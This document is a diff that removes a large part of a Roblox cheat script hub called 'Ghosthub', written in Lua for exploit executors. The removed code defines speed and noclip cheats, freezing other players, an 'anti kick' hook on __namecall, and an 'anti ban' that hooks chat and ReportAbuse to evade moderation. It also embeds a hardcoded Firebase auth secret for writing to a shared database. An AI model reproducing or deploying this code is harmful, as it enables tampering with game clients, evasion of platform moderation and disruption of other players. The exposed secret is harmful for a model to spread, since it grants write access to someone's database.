-    TextButton3.BorderColor3 = Color3.fromRGB(242,243,243)
-    TextButton3.Position = UDim2.new(0.32,0,0.85)
-    TextButton3.Size = UDim2.new(0.2,0,0.1)
-    TextButton3.Font = Enum.Font.Merriweather
-    TextButton3.TextColor3 = Color3.fromRGB(242,243,243)
-    TextButton3.Text = "Pin 📌"
-    TextButton3.TextSize = 14
-    TextButton3.TextScaled = false
-    TextButton3.TextWrapped = false
-
-    if isPined and isPined == true and favoriteId ~= nil then
-       TextButton3.Text = "UnPin 📌"
-       TextButton3.MouseButton1Click:Connect(function()
-       ScreenGui1:Destroy()
-       local favorites = game.HttpService:JSONDecode(readfile("Ghosthub/Favorites.json"))
-       favorites.Favorites["Script"..favoriteId] = nil 
-       writefile("Ghosthub/Favorites.json", game.HttpService:JSONEncode(favorites))
-       FrameMoreScript:ClearAllChildren()
-       GetMoreScript()
-       end)
-    else
-       TextButton3.MouseButton1Click:Connect(function()
-       ScreenGui1:Destroy()
-       AddToFavorite(id)
-       FrameMoreScript:ClearAllChildren()
-       GetMoreScript()
-       RequestMessage("Script", "Script Pinned!")
-       end)
-    end
- end
- 
- ---Only For Admin
- if game.Players.LocalPlayer.Name == Ghostplayer and id ~= 1 then
-    local TextButton4 = Instance.new("TextButton") 
-    TextButton4.Parent = Frame2
-    TextButton4.BackgroundColor3 = Color3.fromRGB(17,17,17)
-    TextButton4.BackgroundTransparency = 0
-    TextButton4.BorderSizePixel = 1
-    TextButton4.BorderColor3 = Color3.fromRGB(242,243,243)
-    TextButton4.Position = UDim2.new(0.09,0,0.85)
-    TextButton4.Size = UDim2.new(0.2,0,0.1)
-    TextButton4.Font = Enum.Font.Merriweather
-    TextButton4.TextColor3 = Color3.fromRGB(242,243,243)
-    TextButton4.Text = "Get Script"
-    TextButton4.TextSize = 18
-    TextButton4.TextScaled = false
-    TextButton4.TextWrapped = true
-
-    TextButton4.MouseButton1Click:Connect(function()
-    ScreenGui1:Destroy()
-    setclipboard(script)
-    RequestMessage("Script","Script Copied!")
-    end)
-    
-    if FileScriptSupported ~= true then
-       TextButton4.Position = UDim2.new(0.32,0,0.85) --Reset the position of button if button3 doesn't supported
-    end
- end
- ---
-end
----
-
-
-
-
-
-
-
-
----Post Shout in Ghosthub Shout Firebase Database Function
-local function PostShout(msg)
- local Secret = "st8UZEDTYU0NsKNLLTMatEDELhrzYgHaodeKGU3K"
- local URL = "https://ghosthub-shout-default-rtdb.firebaseio.com/"
- local Folder = "Shout"
-
- local database = URL..Folder..".json?auth="..Secret
- local request = request or syn.request
- local Table = {}
-
- Table["Username"] = game.Players.LocalPlayer.Name
- Table["UserId"] = game.Players.LocalPlayer.UserId
- Table["Message"] = msg
-
- local send = request({
-    Url = database,
-    Method = "PUT",
-    Headers = {["Content-Type"] = "application/json"},
-    Body = game.HttpService:JSONEncode(Table)
- })
-end
----
-
-
----Shout Contents & Operator
-local ShoutImage = Instance.new("ImageButton")
-ShoutImage.Parent = FrameShout
-ShoutImage.BackgroundColor3 = Color3.new(0,0,0)
-ShoutImage.BackgroundTransparency = 0
-ShoutImage.Size = UDim2.new(0.13,0,0.3)
-ShoutImage.BorderColor3 = Color3.new(1,1,1)
-ShoutImage.BorderSizePixel = 1
-ShoutImage.Position = UDim2.new(0.03,0,0.06)
-ShoutImage.Image = ""
- 
-local ShoutUICorner = Instance.new("UICorner")
-ShoutUICorner.CornerRadius = UDim.new(1, 0)
-ShoutUICorner.Parent = ShoutImage
- 
-local ShoutUIStroke = Instance.new("UIStroke") 
-ShoutUIStroke.Parent = ShoutImage
-ShoutUIStroke.Transparency = 0
-ShoutUIStroke.Color = Color3.fromRGB(242,243,243)
-ShoutUIStroke.Thickness = 1
- 
-local ShoutSpeaker = Instance.new("TextLabel")
-ShoutSpeaker.Parent = FrameShout
-ShoutSpeaker.BackgroundColor3 = Color3.new(1,1,1)
-ShoutSpeaker.BackgroundTransparency = 1
-ShoutSpeaker.BorderColor3 = Color3.new(1,1,1)
-ShoutSpeaker.BorderSizePixel = 0
-ShoutSpeaker.Position = UDim2.new(0.18,0,0.05)
-ShoutSpeaker.TextColor3 = Color3.new(1,1,1)
-ShoutSpeaker.TextXAlignment = Enum.TextXAlignment.Left
-ShoutSpeaker.TextYAlignment = Enum.TextYAlignment.Top
-ShoutSpeaker.Size = UDim2.new(0.75,0,0.1)
-ShoutSpeaker.Font = Enum.Font.Merriweather
-ShoutSpeaker.FontSize = Enum.FontSize.Size14
-ShoutSpeaker.Text = ""
-ShoutSpeaker.TextScaled = false
-ShoutSpeaker.TextSize = 24
-ShoutSpeaker.TextWrapped = true
- 
-local ShoutMessage = ShoutSpeaker:Clone()
-ShoutMessage.Parent = FrameShout
-ShoutMessage.Position = UDim2.new(0.18,0,0.18)
-ShoutMessage.Size = UDim2.new(0.75,0,0.4)
-ShoutMessage.BackgroundTransparency = 1
-ShoutMessage.TextSize = 18
-ShoutMessage.Text = ""
-
-local ShoutTextBox = Instance.new("TextBox")
-ShoutTextBox.Parent = FrameShout
-ShoutTextBox.BackgroundColor3 = Color3.new(0,0,0)
-ShoutTextBox.BackgroundTransparency = 0
-ShoutTextBox.BorderColor3 = Color3.new(1,1,1)
-ShoutTextBox.BorderSizePixel = 1
-ShoutTextBox.Position = UDim2.new(0.03,0,0.7)
-ShoutTextBox.TextColor3 = Color3.new(1,1,1)
-ShoutTextBox.TextXAlignment = Enum.TextXAlignment.Left
-ShoutTextBox.TextYAlignment = Enum.TextYAlignment.Top
-ShoutTextBox.Size = UDim2.new(0.8,0,0.2)
-ShoutTextBox.Font = Enum.Font.Merriweather
-ShoutTextBox.FontSize = Enum.FontSize.Size14
-ShoutTextBox.Text = ""
-ShoutTextBox.ClearTextOnFocus = false
-ShoutTextBox.TextScaled = false
-ShoutTextBox.TextSize = 24
-ShoutTextBox.TextWrapped = true
-ShoutTextBox.Active = true
-
-local ShoutPost = Instance.new("TextButton")
-ShoutPost.Parent = FrameShout
-ShoutPost.BackgroundColor3 = Color3.new(0,0,0)
-ShoutPost.BackgroundTransparency = 0
-ShoutPost.BorderColor3 = Color3.new(1,1,1)
-ShoutPost.BorderSizePixel = 1
-ShoutPost.Position = UDim2.new(0.85,0,0.7)
-ShoutPost.TextColor3 = Color3.new(1,1,1)
-ShoutPost.Size = UDim2.new(0.12,0,0.2)
-ShoutPost.Font = Enum.Font.Merriweather
-ShoutPost.FontSize = Enum.FontSize.Size14
-ShoutPost.Text = "Post"
-ShoutPost.TextScaled = false
-ShoutPost.TextSize = 24
-ShoutPost.TextWrapped = true
-ShoutPost.Active = true
-
-ShoutPost.MouseButton1Click:Connect(function()
-if ShoutTextBox.Text ~= "" then
-   if ShoutSpeaker.Text == game.Players.LocalPlayer.Name and ShoutMessage.Text == ShoutTextBox.Text and ShoutImage.Image == game.Players:GetUserThumbnailAsync(game.Players.LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420) then
-      return
-   end
-   
-   if DetectBadWords(ShoutTextBox.Text) == true then
-      RequestMessage("Error" ,"Bad Words Found!" ,"Please Remove Bad Words")
-      return
-   end
-   
-   ShoutTextBox.Active = false
-   ShoutPost.Active = false
-   local ShoutPostMsg = ShoutTextBox.Text
-   ShoutPost.TextSize = 14
-   ShoutPost.Text = "Posting..."
-   PostShout(ShoutPostMsg) --Posting New Shout in database
-   ShoutMessage.Text = ShoutTextBox.Text
-   ShoutSpeaker.Text = game.Players.LocalPlayer.Name
-   ShoutImage.Image = game.Players:GetUserThumbnailAsync(game.Players.LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
-   ShoutPost.TextSize = 24
-   ShoutPost.Text = "Post"
-   ShoutTextBox.Text = ""
-   ShoutTextBox.Active = true
-   ShoutPost.Active = true
-end
-end)
-
-local CurrentShoutData, IsReady = game.HttpService:JSONDecode(game:HttpGet("https://ghosthub-shout-default-rtdb.firebaseio.com/Shout.json"))
-if CurrentShoutData ~= nil then
-   if CurrentShoutData.Message ~= ShoutMessage.Text or CurrentShoutData.Username ~= ShoutSpeaker.Text or game.Players:GetUserThumbnailAsync(CurrentShoutData.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420) ~= ShoutImage.Image then
-      ShoutMessage.Text = CurrentShoutData.Message
-      ShoutSpeaker.Text = CurrentShoutData.Username
-      ShoutImage.Image = game.Players:GetUserThumbnailAsync(CurrentShoutData.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
-   end
-end
----
-
-
-
-
-
-
----Add MoreScript Button Function
-local MSButtonPosX = 0
-local MSButtonPosZ = 0.00006 
-local MSButtonSlotNum = 0
-
-function AddMoreScriptButton(id, scriptname, script, description, userid, username, date, isPined, favoriteId)
- local MoreScriptButton = Instance.new("TextButton")
- MoreScriptButton.Parent = FrameMoreScript
- MoreScriptButton.BackgroundColor3 = Color3.new(0,0,0)
- MoreScriptButton.BackgroundTransparency = 0
- MoreScriptButton.BorderSizePixel = 1
- MoreScriptButton.BorderColor3 = Color3.new(1,1,1)
- MoreScriptButton.Position = UDim2.new(MSButtonPosX, 0, MSButtonPosZ)
- MoreScriptButton.TextColor3 = Color3.new(1,1,1)
- MoreScriptButton.Size = UDim2.new(0.148,0,0.000135)
- MoreScriptButton.Font = Enum.Font.Merriweather
- MoreScriptButton.FontSize = Enum.FontSize.Size10
- MoreScriptButton.Text = scriptname
- MoreScriptButton.TextScaled = false
- MoreScriptButton.TextSize = 12
- MoreScriptButton.TextWrapped = true
- 
- MoreScriptButton.MouseButton1Click:Connect(function()
- Frame.Visible = false
- OpenGui.Visible = true
- RequestClickMoreScriptButton(scriptname,script,description,userid,username,date,id,isPined,favoriteId)
- end)
- 
- MSButtonSlotNum += 1
- MSButtonPosX += 0.1705
- if MSButtonSlotNum == 6 then
-    MSButtonSlotNum = 0
-    MSButtonPosX = 0
-    MSButtonPosZ += 0.00018
- end
-end
----
-
-
-
-
-
-
-
----Main Functions
-function Main1()
- game:GetService("UserInputService").JumpRequest:connect(function()
- game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
- end)
-end
-
-function Main2()
- game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100
-end
-
-function Main3()
- game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100
-end
-
-function Main4()
- game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
-end
-
-function Main5()
- game:GetService("Players").LocalPlayer.Idled:connect(function()
- game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
- wait(1)
- game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
- end)
- RequestMessage("Script","Anti AFK is now Active","you can afk now")
-end
-
-function Main6()
- --Anti Lag v1
- local a = game
- local b = a.Workspace
- local c = a.Lighting
- local d = b.Terrain
- d.WaterWaveSize = 0
- d.WaterWaveSpeed = 0
- d.WaterReflectance = 0
- d.WaterTransparency = 0
- c.GlobalShadows = false
- c.FogEnd = 9e9
- c.Brightness = 0
- settings().Rendering.QualityLevel = "Level01"
- for e, f in pairs(a:GetDescendants()) do
-   if f:IsA("Part") or f:IsA("Union") or f:IsA("CornerWedgePart") or f:IsA("TrussPart") then
-      f.Material = "Plastic"
-      f.Reflectance = 0
-   elseif f:IsA("Decal") or f:IsA("Texture") then
-      f.Transparency = 0
-   elseif f:IsA("ParticleEmitter") or f:IsA("Trail") then
-      f.Lifetime = NumberRange.new(0)
-   elseif f:IsA("Explosion") then
-      f.BlastPressure = 0
-      f.BlastRadius = 0
-   elseif f:IsA("Fire") or f:IsA("SpotLight") or f:IsA("Smoke") or f:IsA("Sparkles") then
-      f.Enabled = false
-   elseif f:IsA("MeshPart") then
-      f.Material = "Plastic"
-      f.Reflectance = 0
-      f.TextureID = 10385902758728957
-   end
- end
- for e, g in pairs(c:GetChildren()) do
-   if g:IsA("BlurEffect") or g:IsA("SunRaysEffect") or g:IsA("ColorCorrectionEffect") or g:IsA("BloomEffect") or g:IsA("DepthOfFieldEffect") then
-      g.Enabled = false
-   end
- end
- sethiddenproperty(game.Lighting, "Technology", "Compatibility")
-
- --Anti Lag v2
- local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
- local g = game
- local w = g.Workspace
- local l = g.Lighting
- local t = w.Terrain
- t.WaterWaveSize = 0
- t.WaterWaveSpeed = 0
- t.WaterReflectance = 0
- t.WaterTransparency = 0
- l.GlobalShadows = false
- l.FogEnd = 9e9
- l.Brightness = 0
- settings().Rendering.QualityLevel = "QualityLevel1"
- for i,v in pairs(g:GetDescendants()) do
-   if v:IsA("Part") or v:IsA("Union") or v:IsA("MeshPart") then
-      v.Material = "Plastic"
-      v.Reflectance = 0
-   elseif v:IsA("Decal") and decalsyeeted then 
-      v.Transparency = 1
-   elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then 
-      v.Lifetime = NumberRange.new(0)
-   end
- end
-end
-
-function Main7()
- local old
- old = hookmetamethod(
- game,
- "__namecall",
- function(self, ...)
-  local method = tostring(getnamecallmethod())
-  if string.lower(method) == "kick" then
-     return wait(9e9)
-  end
-  return old(self, ...)
- end)
- RequestMessage("Script","Anti Kick is Now Active","Its Only Effective in LocalScript")
-end
-
-function Main8()
- --1st Method
- Y = hookmetamethod(game,"__namecall",function(self,...)
- local args = {...};
- local checkargs = {};
- local method = getnamecallmethod()
- local last
- if method == "Fire" or method == "FireServer" then
-    if self.Name == "MessagePosted" or self.Name == "SayMessageRequest"   then
-       last = args[1]
-       if last == args[1] then
-          return  Y(self,...)
-       else
-          return
-       end
-       if method == "ReportAbuse" and self == game.Players.LocalPlayer then
-          return
-       end
-    end
- end  
- return Y(self,...)
- end)
-
- --2nd Method
- if not game:IsLoaded() then
-    game.Loaded:Wait()
- end
-
- if game.PlaceId ~= 7056922815 then
-    if game.PlaceId ~= 4991214437 then
-       if game.PlaceId ~= 7298553006 then
-          if game.PlaceId ~= 8934886191 then
-             if game.PlaceId ~= 6494527314 then
-                local LP = game:GetService('Players').LocalPlayer
-                local PlayerScripts = LP ~= nil and LP:FindFirstChild('PlayerScripts') or nil
-                local ChatScript = PlayerScripts ~= nil and PlayerScripts:FindFirstChild('ChatScript') or nil
-                local ChatMain = ChatScript ~= nil and ChatScript:FindFirstChild('ChatMain') or nil
-
-                if LP and ChatMain ~= nil then
-                   local Old, Chatted, OldChatted = nil, Instance.new('BindableEvent'), LP.Chatted; Chatted.Name = LP.Name..'_Chatted_Event'
-                   Old = hookmetamethod(game, '__index', newcclosure(function(self, Index)
-                    if checkcaller() and self == LP and Index == 'Chatted' then
-                       return Chatted.Event
-                    elseif not checkcaller() and self == LP and Index == 'Chatted' then
-                       return OldChatted
-                    end
-                    return Old(self, Index)
-                   end))
- 
-                   local Old2, MessagePosted = nil, require(ChatMain).MessagePosted
-                   if MessagePosted ~= "sakanade" then
-                      Old2 = hookfunction(MessagePosted.fire, function(self, ...)
-                      if not checkcaller() then
-                         print(self, ...)
-                         return Chatted:Fire(...)
-                      end
-                      end)
-                   end
-                end
-             end
-          end
-       end
-    end
- end
- RequestMessage("Script","Anti Ban is Now Active","Its Only Effective On Client")
-end
-
-function Main9()
- game:GetService("Lighting").ClockTime = 24
-end
-
-function Main10()
- game:GetService("Lighting").ClockTime = 12
-end
-
-function Main11()
- for i,tools in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
-   if tools:IsA("Tool") then
-      tools.Parent = game.Players.LocalPlayer.Character
-   end
- end
-end
-
-function Main12()
- for i,v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
-   if v:IsA("Tool")  then
-      v.Parent = game.Players.LocalPlayer.Character
-      v.Parent = game.Workspace
-   end
- end
-end
-
-function Main13()
- game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
- game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
- game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
-end
-
-function Main14()
- game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
- game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
- game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, true)
-end
-
-function Main15()
- RequestMessage("Script",game.Players.LocalPlayer.Character.Humanoid.Health,"Health")
-end
-
-function Main16()
- for i, descendant in pairs(workspace:GetDescendants()) do
-   if descendant:IsA("BasePart") then
-      if not descendant:FindFirstChild("OriginalTransparency") then
-         local originalTransparency = Instance.new("NumberValue")
-         originalTransparency.Name = "OriginalTransparency"
-         originalTransparency.Value = descendant.Transparency
-         originalTransparency.Parent = descendant
-      end
-      descendant.Transparency = 0
-   end
- end
-end
-
-function Main17()
- for i, descendant in pairs(workspace:GetDescendants()) do
-   if descendant:IsA("BasePart") then
-      if not descendant:FindFirstChild("OriginalTransparency") then
-	     local originalTransparency = Instance.new("NumberValue")
-		 originalTransparency.Name = "OriginalTransparency"
-		 originalTransparency.Value = descendant.Transparency
-		 originalTransparency.Parent = descendant
-	  end
-	  descendant.Transparency = descendant.OriginalTransparency.Value
-   end
- end
-end
-
-function Main18()
- game.Players.LocalPlayer.Character.Head:Destroy()
-end
-
-function Main19()
- game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame = game.Workspace.CurrentCamera.CFrame
-end
-
-function Main20()
- for _, child in pairs(children) do
-   for _, child in pairs(child:GetChildren()) do
-     table.insert(children, child)
-   end
-   if child:IsA("BasePart") and child.Name == "SpawnLocation" then
-      game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame = child.CFrame * CFrame.new(0,3,0)
-   end
- end
-end
-
-function Main21()
- for i, descendant in pairs(workspace:GetDescendants()) do
-   if descendant:IsA("BasePart") then
-      if not descendant:FindFirstChild("OriginalTransparency") then
-	     local originalTransparency = Instance.new("NumberValue")
-	     originalTransparency.Name = "OriginalTransparency"
-		 originalTransparency.Value = descendant.Transparency
-		 originalTransparency.Parent = descendant
-	  end
-      descendant.Transparency = 0.7
-   end
- end
-end
-
-function Main22()
- for i, descendant in pairs(workspace:GetDescendants()) do
-    if descendant:IsA("BasePart") then
-       if not descendant:FindFirstChild("OriginalTransparency") then
-	      local originalTransparency = Instance.new("NumberValue")
-		  originalTransparency.Name = "OriginalTransparency"
-		  originalTransparency.Value = descendant.Transparency
-		  originalTransparency.Parent = descendant
-	   end
-	   descendant.Transparency = descendant.OriginalTransparency.Value
-	end
- end
-end
-
-function Main23()
- game:GetService("StarterGui"):SetCoreGuiEnabled("Chat", false)
-end
-
-function Main24()
- game:GetService("StarterGui"):SetCoreGuiEnabled("Chat", true)
-end
-
-function Main25()
- RequestMessage("Your Account Age",game.Players.LocalPlayer.AccountAge,"Days")
-end
-
-function Main26()
- game:GetService("SocialService"):CanSendGameInviteAsync(game.Players.LocalPlayer)
- game:GetService("SocialService"):PromptGameInvite(game.Players.LocalPlayer)
-end
-
-function Main27()
- game:Shutdown()
-end
-
-PartCounting = 0
-function Main28()
- PartCounting += 1
- local part = Instance.new("Part")
- local position = Vector3.new(0,1000000000,0)
- part.Name = "ExtraPart"..PartCounting
- part.Material = Enum.Material.Plastic
- part.Transparency = 0
- part.Position = position
- part.Size = Vector3.new(20,0.5,20)
- part.CastShadow = true
- part.Anchored = true
- part.CanCollide = true
- part.Parent = workspace
- workspace:FindFirstChild("ExtraPart"..PartCounting).CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-3,0)
-end
-
-function Main29()
- game.Players.LocalPlayer.Character.Animate.Disabled = true
-end
-
-function Main30()
- game.Players.LocalPlayer.Character.Animate.Disabled = false
-end
-
-function Main31()
- local sc = (debug and debug.setconstant) or setconstant
- local gc = (debug and debug.getconstants) or getconstants
- local pop = game.Players.LocalPlayer.PlayerScripts.PlayerModule.CameraModule.ZoomController.Popper
- for _, v in pairs(getgc()) do
-   if type(v) == 'function' and getfenv(v).script == pop then
-      for i, v1 in pairs(gc(v)) do
-	    if tonumber(v1) == .25 then
-		   sc(v, i, 0)
-		elseif tonumber(v1) == 0 then
-		   sc(v, i, .25)
-	    end
-	  end
-   end
- end
-end
-
-function Main32()
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
-end
-
-function Main33()
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
-end
-
-function Main34()
- local controls = require(game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule):GetControls()
- controls:Disable()
-end
-
-function Main35()
- local controls = require(game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule):GetControls()
- controls:Enable()
-end
-
-function Main36()
- local Http = game:GetService("HttpService")
- local TPS = game:GetService("TeleportService")
- local Api = "https://games.roblox.com/v1/games/"
-
- local _place = game.PlaceId
- local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
- function ListServers(cursor)
-  local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
-  return Http:JSONDecode(Raw)
- end
-
- local Server, Next; repeat
- local Servers = ListServers(Next)
- Server = Servers.data[1]
- Next = Servers.nextPageCursor
- until Server
- TPS:TeleportToPlaceInstance(_place,Server.id,game.Players.LocalPlayer)
-end
-
-function Main37()
- game.Players.LocalPlayer.CameraMaxZoomDistance = 1000000000000
- game.Players.LocalPlayer.CameraMinZoomDistance = -1
-end
-
-LoopFullBrightness = false
-function Main38()
- if LoopFullBrightness == false then
-    LoopFullBrightness = true
-    game:GetService('RunService').Stepped:connect(function()
-    Lighting = game:GetService("Lighting")
-    Lighting.Brightness = 2
-    Lighting.ClockTime = 14
-    Lighting.FogEnd = 100000
-    Lighting.GlobalShadows = false
-    Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
-    end)
- end
-end
-
-DarkMode = false
-function Main39()
- if DarkMode == false then
-    DarkMode = true
-    setting = settings().Network
-    local Effect = Instance.new("ColorCorrectionEffect")
-    Effect.Parent = game.Lighting
-    Effect.Saturation = -1
-    Effect.Brightness = -0.3
- end
-end
-
-function Main40()
- if DarkMode == true then
-    DarkMode = false
-    setting = settings().Network
-    local Effect = Instance.new("ColorCorrectionEffect")
-    Effect.Parent = game.Lighting
-    Effect.Saturation = 1
-    Effect.Brightness = 0.3
- end
-end
-
-LayDown = false
-function Main41()
- if LayDown == false then
-    LayDown = true
-    local part = Instance.new("Part")
-    part.Name = "LayDownPart"
-    part.Color = Color3.new(0,0,0)
-    part.Material = Enum.Material.Plastic
-    part.Transparency = 1
-    part.Position = Vector3.new(0,100000,0)
-    part.Size = Vector3.new(1,0.5,1)
-    part.CastShadow = true
-    part.Anchored = true
-    part.CanCollide = true
-    part.Parent = workspace
-    workspace:FindFirstChild("LayDownPart").CFrame = game.Players.LocalPlayer.Character.LeftFoot.CFrame * CFrame.Angles(math.rad(90),math.rad(0),math.rad(0))
- end
-end
-
----Laydown Operator
-game:GetService('RunService').Heartbeat:connect(function()
-if LayDown == true and game.Players.LocalPlayer.Character.Humanoid.Health >= 1 then
-   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").LayDownPart.CFrame
-end
-if LayDown == true and game.Players.LocalPlayer.Character.Humanoid.Health <= 0 then
-   LayDown = false
-end
-end)
----
-
-function Main42()
-LayDown = false
-game:GetService("Workspace").LayDownPart:Destroy()
-end
-
-function Main43()
- local g = game
- local plrs = g:GetService("Players")
- local lp = plrs.LocalPlayer
- local c = lp.Character
-
- if c and c.Parent then
-    local hum = c:FindFirstChildOfClass("Humanoid")
-    if hum then
-       hum.Sit = not hum.Sit
-    end
- end
-end
-
-function Main44()
- CountPlayer = 0
- for _, v in pairs(game.Players:GetChildren()) do 
-   CountPlayer += 1
- end
- RequestMessage("Script",CountPlayer,"Players")
-end
-
-function Main45()
- for i,v in pairs(game.Lighting:GetChildren()) do
-   if v:IsA("Script") == false and v:IsA("LocalScript") == false then
-      v:remove()
-   end
- end
- while true and wait() do
-  game.Lighting.FogEnd = math.huge
-  game.Lighting.FogStart = 0
-  game.Lighting.Ambient = Color3.fromRGB(167, 167, 167)
-  game.Lighting.OutdoorAmbient = Color3.fromRGB(167, 167, 167)
- end
-end
-
-function Main46()
-FreezePlayers = true
-end
-
----Freeze Players Operator
-FreezePlayers = false
-game:GetService('RunService').Heartbeat:connect(function()
-if FreezePlayers == true then
-   for _, v in pairs(game.Players:GetPlayers()) do 
-     if v.Name ~= game.Players.LocalPlayer.Name then
-        v.Character.HumanoidRootPart.Anchored = true
-     end
-   end
-end
-end)
----
-
-function Main47()
- FreezePlayers = false
- for _, v in pairs(game.Players:GetPlayers()) do 
-   if v.Name ~= game.Players.LocalPlayer.Name then   
-      v.Character.HumanoidRootPart.Anchored = false
-  end
- end
-end
-
-function Main48()
- game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-7,0)
-end
-
-function Main49()
- local humanoid = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
- humanoid.Sit = true
- task.wait(0.1)
- humanoid.RootPart.CFrame = humanoid.RootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
- for _, v in ipairs(humanoid:GetPlayingAnimationTracks()) do
-   v:Stop()
- end
-end
-
-function Main51()
- local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
- if tool then
-   for i, v in pairs(tool:GetDescendants()) do
-	 if v and v.Parent and v:IsA("Mesh") or v:IsA("SpecialMesh") then
-	    v:Destroy()
-     end
-   end
- end
-end
-
-function Main50()
- workspace.CurrentCamera:remove()
- wait(.1)
- repeat wait() until game.Players.LocalPlayer.Character ~= nil
- workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid')
- workspace.CurrentCamera.CameraType = "Custom"
- game.Players.LocalPlayer.CameraMinZoomDistance = 0.5
- game.Players.LocalPlayer.CameraMaxZoomDistance = 400
- game.Players.LocalPlayer.CameraMode = "Classic"
- game.Players.LocalPlayer.Character.Head.Anchored = false
-end
-
-function Main52()
- game.Players.LocalPlayer.Character.UpperTorso.Waist:Destroy()
-end
-
-function Main53()
- promptNewRig = function(rig)
- game.AvatarEditorService:PromptSaveAvatar(game.Players.LocalPlayer.Character.Humanoid.HumanoidDescription, Enum.HumanoidRigType[rig])
- local result = game.AvatarEditorService.PromptSaveAvatarCompleted:Wait()
- if result == Enum.AvatarPromptResult.Success then
-    game.Players.LocalPlayer.Character.Humanoid.Health = 0
- end
- end
- promptNewRig("R15")
-end
-
-function Main54()
- promptNewRig = function(rig)
- game.AvatarEditorService:PromptSaveAvatar(game.Players.LocalPlayer.Character.Humanoid.HumanoidDescription, Enum.HumanoidRigType[rig])
- local result = game.AvatarEditorService.PromptSaveAvatarCompleted:Wait()
- if result == Enum.AvatarPromptResult.Success then
-    game.Players.LocalPlayer.Character.Humanoid.Health = 0
- end
- end
- promptNewRig("R6")
-end
-
----Noclip Operator
-local Noclip = false
-game:GetService('RunService').RenderStepped:connect(function()
-if Noclip == true then
-   game.Players.LocalPlayer.Character.Head.CanCollide = false
-   game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
-   game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
-   game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
-end
-end)
----
-
-function Main55()
- Noclip = true
-end
-
-function Main56()
- Noclip = false
-end
-
-local CurrentGravity = workspace.Gravity
-function Main57()
- workspace.Gravity = CurrentGravity / 4
-end
-
-function Main58()
- workspace.Gravity = CurrentGravity
-end
-
-function Main59()
- workspace.Gravity = 0
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false) 
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false) 
- game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
-end
-
-function Main60()
- workspace.Gravity = CurrentGravity
- game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true) 
